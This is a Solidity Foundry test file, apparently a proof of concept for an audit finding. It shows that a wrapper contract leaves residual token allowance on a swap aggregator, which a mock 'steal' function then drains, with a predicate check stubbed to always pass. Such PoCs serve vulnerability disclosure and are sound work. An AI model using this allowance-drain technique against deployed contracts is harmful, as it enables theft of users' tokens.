// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";
import {WETH} from "@solmate/tokens/WETH.sol";
import {WrapperForPoC, IAggregator} from "src/WrapperForPoC.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockAggregator is IAggregator {
    uint256 public spendFractionBps;
    address public thief;
    function setSpendFractionBps(uint256 bps) external { spendFractionBps = bps; }
    function setThief(address t) external { thief = t; }
    function steal(ERC20 token, address from, uint256 amount) external {
        token.transferFrom(from, thief, amount);
    }
    function swap(address, SwapDescription calldata desc, bytes calldata)
        external
        payable
        override
        returns (uint256 returnAmount, uint256 spentAmount)
    {
        uint256 bps = spendFractionBps == 0 ? 10_000 : spendFractionBps;
        uint256 toSpend = (desc.amount * bps) / 10_000;
        desc.srcToken.transferFrom(msg.sender, address(this), toSpend);
        return (toSpend, toSpend);
    }
}

contract MockPredicateBypass {
    function genericUserCheckPredicate(address, bytes calldata) external pure returns (bool) { return true; }
}

contract AllowancePoCTest is Test {
    MockERC20 src;
    MockERC20 vaultToken;
    WETH weth;
    MockAggregator agg;
    MockPredicateBypass pred;
    WrapperForPoC wrapper;

    function setUp() public {
        src = new MockERC20("SRC","SRC",18);
        vaultToken = new MockERC20("SHARE","SHARE",18);
        weth = new WETH();
        agg = new MockAggregator();
        pred = new MockPredicateBypass();
        wrapper = new WrapperForPoC(IAggregator(address(agg)), weth, IPredicateBypass(address(pred)));
        src.mint(address(this), 1_000 ether);
        agg.setSpendFractionBps(5000);
        agg.setThief(address(this));
    }

    function _desc(uint256 amount) internal view returns (IAggregator.SwapDescription memory d) {
        d = IAggregator.SwapDescription({
            srcToken: src,
            dstToken: vaultToken,
            srcReceiver: payable(address(0)),
            dstReceiver: payable(address(wrapper)),
            amount: amount,
            minReturnAmount: 0,
            flags: 0
        });
    }

    function test_residual_allowance_drain() public {
        IAggregator.SwapDescription memory d = _desc(100 ether);
        bytes memory data;
        src.approve(address(wrapper), type(uint256).max);
        // Simulate a teller address; not used by the mock wrapper beyond approve on supported asset
        address tellerLike = address(0x111);
        // Call; aggregator will spend 50, wrapper had approved 100 → 50 residual allowance remains on aggregator
        wrapper.depositOneInch(vaultToken, tellerLike, d, data);
        uint256 beforeBal = src.balanceOf(address(wrapper));
        agg.steal(src, address(wrapper), 50 ether);
        uint256 afterBal = src.balanceOf(address(wrapper));
        assertLt(afterBal, beforeBal, "residual allowance allowed drain");
    }
}